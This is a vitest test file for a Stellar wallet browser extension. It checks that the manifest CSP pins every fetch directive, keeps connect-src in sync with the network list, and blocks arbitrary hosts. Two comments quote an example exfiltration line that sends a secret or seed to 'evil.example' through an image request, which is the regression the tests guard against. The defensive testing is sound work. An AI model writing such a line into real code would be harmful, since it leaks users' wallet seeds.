/**
 * P2 hardening guard: the manifest CSP's `connect-src` must stay in sync with
 * the network catalogue and must never fall back to a blanket `https:`.
 *
 * `wxt.config.ts` cannot import the runtime module cleanly at config-eval
 * time, so the origin list is written out literally there, this test is the
 * contract that keeps the two files in sync.
 *
 * Second job (added with `default-src`): a CSP that names only `script-src`,
 * `object-src` and `connect-src` leaves *every other* fetch directive wide
 * open, so `new Image().src = 'https://evil.example/' + secret` exfiltrates
 * just as well as `fetch()` would. The directive sweep below fails on any
 * fetch directive that is neither explicitly pinned nor covered by
 * `default-src`, and on any source expression that permits an arbitrary host.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  ALCHEMY_SOROBAN_ORIGINS,
  BUILTIN_NETWORKS,
  CSP_SOROBAN_ORIGINS,
} from '../src/core/stellar/networks';
import { SOROSWAP_API_URL } from '../src/core/stellar/soroswap';
import config from '../wxt.config';

const configSource = readFileSync(join(__dirname, '..', 'wxt.config.ts'), 'utf8');

type ManifestFn = (env: { browser: string; manifestVersion: 3; command: 'build' }) => {
  content_security_policy?: { extension_pages?: string };
};

function manifestFor(browser: string): ReturnType<ManifestFn> {
  return (config.manifest as unknown as ManifestFn)({
    browser,
    manifestVersion: 3,
    command: 'build',
  });
}

/** `"a 'self'; b x y;"` -> `{ 'a': ["'self'"], 'b': ['x', 'y'] }` */
function parseCsp(csp: string): Record<string, string[]> {
  const out: Record<string, string[]> = {};
  for (const section of csp.split(';')) {
    const [name, ...values] = section.trim().split(/\s+/u).filter(Boolean);
    if (name) out[name] = values;
  }
  return out;
}

function extensionPagesCsp(browser = 'chrome'): Record<string, string[]> {
  const csp = manifestFor(browser).content_security_policy?.extension_pages;
  expect(csp, 'extension_pages CSP missing').toBeTypeOf('string');
  return parseCsp(csp as string);
}

/**
 * Every origin the extension is allowed to reach, derived from the code rather
 * than restated here.
 *
 * Grown in v1.3 for two reasons the old version missed:
 *  - `sorobanRpcUrls` is a *chain*, and a fallback whose origin is not in
 *    `connect-src` is not a fallback: the request is blocked by the CSP and
 *    the wallet reports a network failure it could have avoided. Only the
 *    primary was checked before, so adding a fallback silently did nothing.
 *  - `SOROSWAP_API_URL` was never covered at all. The literal happened to be
 *    in `wxt.config.ts`, but nothing tied the two together, so changing the
 *    constant would have broken every aggregator quote at runtime only.
 */
function expectedOrigins(): string[] {
  const origins = new Set<string>();
  for (const net of Object.values(BUILTIN_NETWORKS)) {
    for (const url of [net.horizonUrl, ...net.sorobanRpcUrls, net.friendbotUrl]) {
      if (url !== null) origins.add(new URL(url).origin);
    }
  }
  origins.add(new URL(SOROSWAP_API_URL).origin);
  return [...origins];
}

/**
 * Every fetch directive that can reach the network. If one of these is absent
 * *and* `default-src` is absent, the browser allows anything.
 */
const FETCH_DIRECTIVES = [
  'script-src',
  'style-src',
  'img-src',
  'font-src',
  'media-src',
  'frame-src',
  'child-src',
  'connect-src',
  'object-src',
  'manifest-src',
  'worker-src',
];

/** Source expressions that let a page reach a host the wallet does not control. */
function permitsArbitraryHost(value: string): boolean {
  if (value === '*') return true;
  // Scheme-only sources: `https:`, `http:`, `blob:`, `filesystem:`.
  // `data:` is deliberately not in here; a data URL cannot reach the network.
  if (/^(https?|blob|filesystem|ws{1,2}):$/u.test(value)) return true;
  // Wildcard host patterns such as `https://*.example.com` or `*.example.com`.
  return value.includes('*');
}

describe('manifest CSP (wxt.config.ts)', () => {
  it('lists every built-in network origin in connect-src', () => {
    for (const origin of expectedOrigins()) {
      expect(configSource, `missing CSP entry for ${origin}`).toContain(origin);
    }

    const connect = extensionPagesCsp()['connect-src'] ?? [];
    for (const origin of expectedOrigins()) {
      expect(connect, `connect-src is missing ${origin}`).toContain(origin);
    }
  });

  it('does not use the blanket https: source anymore', () => {
    expect(configSource).not.toMatch(/connect-src[^;]*'self'\s+https:/u);
  });

  /**
   * The runtime-configurable endpoint (`settings.sorobanRpcOverride`) is only
   * accepted when its origin is in `CSP_SOROBAN_ORIGINS`, because MV3 cannot
   * add a host to `connect-src` after packaging. If that list and the manifest
   * drift apart, the check in `protocol.ts` either rejects a host that would
   * have worked, or (worse) accepts one that the browser then blocks with no
   * user-visible reason.
   */
  it('covers every origin the endpoint override may be set to', () => {
    const connect = extensionPagesCsp()['connect-src'] ?? [];
    expect(CSP_SOROBAN_ORIGINS.length).toBeGreaterThan(0);
    for (const origin of CSP_SOROBAN_ORIGINS) {
      expect(connect, `connect-src is missing ${origin}`).toContain(origin);
    }
  });

  it('lists the Alchemy hosts as bare origins, never with a key', () => {
    for (const origin of ALCHEMY_SOROBAN_ORIGINS) {
      expect(configSource).toContain(origin);
      // `<origin>/*` is the host-permission pattern and is fine. Anything else
      // after the host means somebody pasted a full endpoint, i.e. an API
      // key, into the manifest.
      expect(configSource).not.toMatch(
        new RegExp(`${origin.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')}/[^*]`, 'u'),
      );
    }
    // Same guard for the whole file: no `/v2/<something>` endpoint anywhere.
    expect(configSource).not.toMatch(/g\.alchemy\.com\/v2\//u);
  });

  it('requests host access for every endpoint it may connect to', () => {
    const manifest = manifestFor('chrome') as unknown as {
      host_permissions?: string[];
      optional_host_permissions?: string[];
    };
    const granted = [
      ...(manifest.host_permissions ?? []),
      ...(manifest.optional_host_permissions ?? []),
    ];
    for (const origin of [...expectedOrigins(), ...CSP_SOROBAN_ORIGINS]) {
      expect(granted, `no host permission pattern for ${origin}`).toContain(`${origin}/*`);
    }
  });

  it('keeps script-src free of remote sources (invariant 3)', () => {
    expect(configSource).toContain("script-src 'self' 'wasm-unsafe-eval'");
    expect(configSource).not.toMatch(/script-src[^;]*https?:\/\//u);
  });

  it("declares default-src 'self' so unnamed directives are not wide open", () => {
    const csp = extensionPagesCsp();
    expect(csp['default-src']).toEqual(["'self'"]);
  });

  it.each(['chrome', 'firefox'])('closes every fetch directive (%s)', (browser) => {
    const csp = extensionPagesCsp(browser);
    const fallback = csp['default-src'];

    for (const directive of FETCH_DIRECTIVES) {
      const effective = csp[directive] ?? fallback;
      expect(effective, `${directive} is unrestricted: no value and no default-src`).toBeDefined();

      for (const value of effective as string[]) {
        expect(
          permitsArbitraryHost(value),
          `${directive} allows an arbitrary host via "${value}"`,
        ).toBe(false);
      }
    }
  });

  it('blocks image/font/media exfiltration specifically', () => {
    // The regression this guards: with only script-/object-/connect-src set,
    // `new Image().src = 'https://evil.example/?' + seed` was allowed.
    const csp = extensionPagesCsp();
    for (const directive of ['img-src', 'font-src', 'media-src', 'frame-src']) {
      const effective = csp[directive] ?? csp['default-src'] ?? [];
      expect(effective.some((v) => v.startsWith('http'))).toBe(false);
      expect(effective).not.toContain('*');
    }
    // data: is allowed for images only, and only because it cannot make a
    // network request (qrcode-generator's createDataURL path).
    expect(csp['img-src']).toContain('data:');
    expect(csp['font-src'] ?? []).not.toContain('data:');
  });

  it("allows inline styles but never inline scripts", () => {
    const csp = extensionPagesCsp();
    // The UI uses `style={{ … }}` attributes and the dev server injects
    // <style> blocks; CSS cannot exfiltrate while img/font/style are 'self'.
    expect(csp['style-src']).toContain("'unsafe-inline'");
    expect(csp['script-src']).not.toContain("'unsafe-inline'");
    expect(csp['script-src']).not.toContain("'unsafe-eval'");
    // hash-wasm needs WebAssembly; that is the one script relaxation (ARCH §1).
    expect(csp['script-src']).toContain("'wasm-unsafe-eval'");
  });

  it('matches the CSP that was actually generated into the build output', () => {
    for (const dir of ['chrome-mv3', 'firefox-mv3']) {
      const path = join(__dirname, '..', '.output', dir, 'manifest.json');
      let generated: string;
      try {
        generated = readFileSync(path, 'utf8');
      } catch {
        continue; // no build in this working copy; the config assertions stand
      }
      const manifest = JSON.parse(generated) as {
        content_security_policy?: { extension_pages?: string };
      };
      const csp = manifest.content_security_policy?.extension_pages ?? '';
      expect(csp, `${dir} manifest has no default-src`).toContain("default-src 'self'");
      expect(parseCsp(csp)).toEqual(extensionPagesCsp(dir.startsWith('chrome') ? 'chrome' : 'firefox'));
    }
  });
});
